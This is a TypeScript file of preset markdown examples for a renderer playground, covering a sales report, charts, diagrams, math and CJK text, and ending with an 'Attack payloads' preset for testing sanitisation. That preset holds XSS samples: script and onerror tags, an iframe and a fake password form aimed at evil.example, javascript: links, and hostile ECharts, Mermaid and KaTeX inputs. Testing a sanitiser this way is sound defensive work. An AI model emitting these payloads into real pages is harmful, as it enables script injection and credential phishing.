// Example documents for the playground. Each one is something a model might really answer with.

const fence = (lang: string, body: string) => `\`\`\`${lang}\n${body}\n\`\`\``;
const chart = (option: object) => fence('echarts', JSON.stringify(option, null, 2));

export interface Preset {
  id: string;
  label: string;
  markdown: string;
}

const ANSWER = `# Quarterly sales review

Revenue grew **18%** quarter over quarter, mostly from the _self-serve_ plan. Three things stand out:

1. Self-serve signups doubled after the pricing change.
2. Enterprise deals took longer to close (median **41 days**).
3. Churn fell to <mark>2.1%</mark>, the lowest this year.[^1]

| Plan | Revenue | Change |
|---|---:|---:|
| Self-serve | $412k | +34% |
| Team | $288k | +9% |
| Enterprise | $640k | +12% |

${chart({
  title: { text: 'Revenue by month (k$)' },
  tooltip: { trigger: 'axis' },
  legend: { bottom: 0 },
  xAxis: { type: 'category', data: ['Jul', 'Aug', 'Sep'] },
  yAxis: { type: 'value' },
  series: [
    { name: 'Self-serve', type: 'bar', data: [120, 138, 154] },
    { name: 'Team', type: 'bar', data: [92, 96, 100] },
    { name: 'Enterprise', type: 'line', data: [200, 210, 230] },
  ],
})}

The forecast assumes compound growth, \\( R_{n} = R_0 (1 + g)^n \\), with \\( g = 0.06 \\) per month:

\\[ R_{12} = 1340 \\times 1.06^{12} \\approx 2697 \\]

${fence('mermaid', 'flowchart LR\n  Visit[Visit pricing] --> Trial{Start trial?}\n  Trial -- Yes --> Paid[Paid plan]\n  Trial -- No --> Nurture[Email sequence]\n  Nurture --> Trial')}

To pull the same numbers yourself:

${fence('sql', "select plan, sum(amount) as revenue\nfrom invoices\nwhere paid_at >= date '2026-07-01'\ngroup by plan\norder by revenue desc;")}

- [x] Update the pricing page
- [ ] Shorten the enterprise security review

[^1]: Churn is measured on accounts older than 30 days.
`;

const CHARTS = `## Charts from a JSON fence

A fence tagged \`echarts\` holds an ECharts option in JSON. Functions, HTML, links and images are removed before it is drawn.

${chart({
  title: { text: 'Latency (ms)', left: 'center' },
  tooltip: { trigger: 'axis' },
  xAxis: { type: 'category', data: ['p50', 'p75', 'p90', 'p95', 'p99'] },
  yAxis: { type: 'value' },
  series: [{ type: 'line', smooth: true, areaStyle: {}, data: [120, 180, 260, 340, 610] }],
})}

${chart({
  title: { text: 'Traffic sources', left: 'center' },
  tooltip: { trigger: 'item' },
  series: [{ type: 'pie', radius: ['40%', '70%'], data: [{ name: 'Search', value: 48 }, { name: 'Direct', value: 27 }, { name: 'Referral', value: 15 }, { name: 'Social', value: 10 }] }],
})}

${chart({
  series: [{ type: 'sankey', data: [{ name: 'Visit' }, { name: 'Trial' }, { name: 'Paid' }, { name: 'Left' }], links: [{ source: 'Visit', target: 'Trial', value: 60 }, { source: 'Visit', target: 'Left', value: 40 }, { source: 'Trial', target: 'Paid', value: 25 }, { source: 'Trial', target: 'Left', value: 35 }] }],
})}
`;

const DIAGRAMS = `## Mermaid diagrams

${fence('mermaid', 'sequenceDiagram\n  participant U as User\n  participant A as App\n  participant M as Model\n  U->>A: Ask a question\n  A->>M: Prompt + context\n  M-->>A: Markdown, streamed\n  A-->>U: Rendered safely')}

${fence('mermaid', 'stateDiagram-v2\n  [*] --> Draft\n  Draft --> Review: submit\n  Review --> Draft: changes requested\n  Review --> Published: approve\n  Published --> [*]')}

${fence('mermaid', 'erDiagram\n  CUSTOMER ||--o{ ORDER : places\n  ORDER ||--|{ LINE_ITEM : contains')}
`;

const MATH = `## Math, the way models write it

Inline with \\( \\) — the area of a circle is \\( A = \\pi r^2 \\) — and display with \\[ \\]:

\\[ \\int_0^\\infty e^{-x^2} \\, dx = \\frac{\\sqrt{\\pi}}{2} \\]

$$
\\begin{aligned}
\\nabla \\cdot \\mathbf{E} &= \\frac{\\rho}{\\varepsilon_0} \\\\
\\nabla \\times \\mathbf{B} &= \\mu_0 \\mathbf{J} + \\mu_0 \\varepsilon_0 \\frac{\\partial \\mathbf{E}}{\\partial t}
\\end{aligned}
$$

Prices stay text: the plan costs $5 a month, or $50 a year.
`;

const CJK = `## 日本語・中文

**「強調」**は日本語の約物の隣でも正しく太字になります。中文的**强调**也一样。

| 項目 | 値 |
|---|---:|
| 売上 | 1,200 |
| 前月比 | +12% |

1行の改行は、チャットのように改行として表示されます。
次の行です。
`;

const ATTACKS = `## Attack payloads

Everything below is what a prompt injection could make a model answer with. **Nothing here runs**, and nothing is requested from \`evil.example\`.

Raw HTML — script, event handler, iframe, fake form:

<script>alert('script')</script>

<img src="x" onerror="alert('onerror')">

<iframe src="https://evil.example/frame"></iframe>

<form action="https://evil.example/login"><input type="password" name="pw"><button>Sign in</button></form>

Links — only http(s), mailto and relative links survive: [javascript](javascript:alert('link')) · [data](data:text/html,<script>alert(1)</script>) · [protocol-relative](//evil.example/phish) · [a normal link](https://example.com)

A chart whose title link, tooltip and symbol are all attacks (hover it, click the title):

${chart({
  title: { text: 'Click me', link: "javascript:alert('title')" },
  tooltip: { formatter: "<img src=x onerror=alert('tooltip')>{b}: {c}" },
  xAxis: { type: 'category', data: ['A', 'B', 'C'] },
  yAxis: {},
  graphic: [{ type: 'image', style: { image: 'https://evil.example/tracker.png' } }],
  series: [{ type: 'bar', data: [3, 5, 2] }, { type: 'custom', renderItem: 'alert(1)' }],
})}

A diagram that tries to switch security off:

${fence('mermaid', '%%{init: {"securityLevel": "loose", "flowchart": {"htmlLabels": true}}}%%\nflowchart LR\n  X["<img src=x onerror=alert(\'mermaid\')>"] --> Y\n  click Y call alert(1)')}

Math that tries to link: $$\\href{javascript:alert('katex')}{click}$$
`;

export const PRESETS: Preset[] = [
  { id: 'answer', label: 'Chat answer', markdown: ANSWER },
  { id: 'charts', label: 'Charts', markdown: CHARTS },
  { id: 'diagrams', label: 'Diagrams', markdown: DIAGRAMS },
  { id: 'math', label: 'Math', markdown: MATH },
  { id: 'cjk', label: '日本語', markdown: CJK },
  { id: 'attacks', label: 'Attack payloads', markdown: ATTACKS },
];
